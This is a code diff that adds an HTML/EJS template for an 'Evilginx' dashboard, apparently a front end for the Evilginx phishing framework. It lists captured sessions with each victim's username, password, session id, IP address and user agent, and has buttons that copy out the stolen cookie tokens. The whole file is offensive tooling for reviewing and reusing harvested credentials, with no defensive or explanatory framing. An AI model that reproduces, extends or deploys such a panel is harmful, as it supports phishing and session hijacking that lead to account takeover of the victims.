@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+
+<head lang="en" dir="ltr">
+    <title>Evilginx</title>
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="css/main.css">
+    <meta name="viewport" content="width=device-width">
+    <link rel="shortcut icon" type="image/png" href="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png">
+</head>
+
+<body>
+    <div class="header">
+        <img src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png">
+        <h1>
+            Evilginx
+        </h1>
+    </div>
+   <div class="session">
+       <table id="t01">
+        <tr>
+			<th>Session Number</th>
+			<th >Phishlet</th>
+			<th>Landing_URL</th>
+            <th>Username <br><br>Password</th>
+            <th>Custom Parameters</th>
+            <th>Session id</th>
+            <th >User Agent</th>
+            <th >Remote_addr</th>
+            <th><br>Create_time<br><br>Update_time<br><br></th>
+			<th>Cookies Tokens</th>
+        </tr>
+        <%data.map(item=>{%>
+            <tr>    
+                <td><%=item.id%></td>
+                <td><%=item.phishlet%></td>
+                <td><%=item.landing_url%></td>
+                <td><%=item.username%><br><br><%=item.password%></td>
+                <td><button onclick="myFunction(this)">
+                    Copy Details
+                    <span style="display: none"><%=JSON.stringify(item.custom)%></span>
+                </button>
+                </td>
+                <td style="word-break: break-all; font-size: 90%; padding: 20px 10px 20px 10px;"><%=item.session_id%></td>
+                <td><%=item.useragent%></td>
+                <td><%=item.remote_addr%></td>
+                <td><%=JSON.stringify(new Date(item.create_time).toLocaleString())%><br><br><%=JSON.stringify(new Date(item.update_time).toLocaleString())%></td>
+                <td><button onclick="myFunction(this)">
+                    Copy Details
+                    <span style="display: none"><%=JSON.stringify(item.tokens)%></span>
+                </button></td>
+            </tr>
+        <%})%>
+        <script>
+            function myFunction(ele) {
+                var input = document.createElement('textarea');
+                input.innerHTML = ele.children[0].innerText;
+                document.body.appendChild(input);
+                input.select();
+                document.execCommand('copy');
+                document.body.removeChild(input);
+                alert("Copied the text: " + ele.children[0].innerText);
+            }
+        </script>
+        
+        
+       </table>
+   </div>
+</body>
+
+</html>
